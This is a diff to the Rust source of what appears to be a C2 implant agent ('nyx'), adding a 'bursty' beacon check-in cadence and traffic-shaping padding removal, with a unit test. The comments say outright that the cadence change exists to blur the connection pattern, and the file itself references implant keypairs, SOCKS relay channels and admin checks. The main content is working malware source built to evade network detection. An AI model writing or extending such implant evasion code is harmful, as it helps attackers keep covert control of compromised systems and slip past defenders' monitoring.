@@ -8,7 +8,7 @@
 use std::path::{Path, PathBuf};
 use std::time::Duration;
 
-use nyx_profile::ServerEnvelope;
+use nyx_profile::{ServerEnvelope, TimingBaseline};
 use nyx_protocol::{
     encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
     ImplantKeypair, Response, SessionInfo, SessionKey, Task, TaskResponse,
@@ -340,13 +340,27 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     tracing::info!(beacon_id, "check-in accepted");
 
     // ---- beacon loop -------------------------------------------------------
+    // `set timing_baseline` from the profile: `uniform` (default) is the
+    // classic sleep±jitter cadence; `bursty` paces check-ins as short-interval
+    // bursts separated by long sleeps, blurring the connection cadence.
+    let timing = cfg
+        .profile
+        .as_ref()
+        .map(|p| p.timing_baseline())
+        .unwrap_or_default();
+    let mut cycle: u32 = 0;
     let mut pending_responses: Vec<TaskResponse> = Vec::new();
     // Tasks unpacked from mid-flush reply frames (BUG-1). They were dequeued
     // server-side before anything this cycle's reply carries, so they run
     // first (FIFO vs the server queue).
     let mut deferred_tasks: Vec<Task> = Vec::new();
     loop {
-        std::thread::sleep(jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct));
+        let mut sleep_for = jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct);
+        if timing == TimingBaseline::Bursty {
+            sleep_for = bursty_sleep(cycle, sleep_for);
+        }
+        cycle = cycle.wrapping_add(1);
+        std::thread::sleep(sleep_for);
 
         // Drain relay sockets (Connect/Socks channels) into the pending batch
         // before the POST — mirrors the PIC beacon's per-cycle pump
@@ -691,11 +705,22 @@ fn encode_batch(pending: &mut [TaskResponse]) -> Vec<u8> {
 
 /// Recover the raw encrypted frame from a server response body. With no
 /// envelope (or a `print` terminator with no transform steps) the body *is* the
-/// frame. Otherwise invert the transform chain. For a `header`/`parameter`
-/// terminator the transformed bytes ride in a header, not the body — the dev
-/// agent doesn't speak that variant (the PIC implant will), so this returns the
-/// body unchanged and the frame parse will fail loudly, surfacing the mismatch.
+/// frame. Otherwise strip the traffic-shaping padding (appended after the
+/// transform chain, self-delimiting) and invert the transform chain. For a
+/// `header`/`parameter` terminator the transformed bytes ride in a header, not
+/// the body — the dev agent doesn't speak that variant (the PIC implant will),
+/// so this returns the body unchanged and the frame parse will fail loudly,
+/// surfacing the mismatch.
 fn unwrap_server_envelope(env: &ServerEnvelope, body: &[u8]) -> Vec<u8> {
+    // Padding comes off BEFORE decode (it rides after the transform chain);
+    // on failure keep the raw bytes — same loud-parse discipline as below.
+    let body = match env.strip_padding(body) {
+        Ok(b) => b,
+        Err(e) => {
+            tracing::warn!(?e, "server envelope padding strip failed; trying raw frame");
+            body
+        }
+    };
     if env.steps.is_empty() {
         return body.to_vec();
     }
@@ -1424,6 +1449,21 @@ fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
     Duration::from_secs(secs)
 }
 
+/// `bursty` cadence (profile `set timing_baseline "bursty"`): BURST_LEN
+/// short-interval cycles fire back-to-back, then one full-length sleep is the
+/// quiet gap before the next burst. Pure logic (no sleeping) so the cadence
+/// shape is unit-testable.
+fn bursty_sleep(cycle: u32, base: Duration) -> Duration {
+    const BURST_LEN: u32 = 4;
+    if cycle % (BURST_LEN + 1) == BURST_LEN {
+        base // quiet gap after a burst
+    } else {
+        // In-burst interval: a fraction of the base, floored so a tiny
+        // sleeptime can't spin the loop.
+        (base / 8).max(Duration::from_millis(500))
+    }
+}
+
 fn hostname() -> String {
     std::env::var("HOSTNAME")
         .or_else(|_| std::env::var("COMPUTERNAME"))
@@ -1479,6 +1519,26 @@ fn is_admin() -> u8 {
 mod tests {
     use super::*;
     use std::fs;
+
+    #[test]
+    fn bursty_cadence_alternates_short_bursts_and_long_gaps() {
+        // 间隔序列性质(不真睡):每 5 个周期一次长睡眠(cycle 4、9),其余为短突发间隔。
+        let base = Duration::from_secs(60);
+        let seq: Vec<Duration> = (0..10).map(|c| bursty_sleep(c, base)).collect();
+        for (i, d) in seq.iter().enumerate() {
+            if i % 5 == 4 {
+                assert_eq!(*d, base, "cycle {i} should be the long gap");
+            } else {
+                assert!(*d < base, "cycle {i} should be a short in-burst interval");
+                assert!(*d >= Duration::from_millis(500), "cycle {i} above the floor");
+            }
+        }
+        // base 很小时短间隔也有下限,不会忙循环。
+        assert_eq!(
+            bursty_sleep(0, Duration::from_millis(100)),
+            Duration::from_millis(500)
+        );
+    }
 
     /// 建 work_dir 临时目录 + 一个子文件，返回 (tempdir, work_dir_path)。
     fn setup_workdir() -> (tempfile::TempDir, PathBuf) {
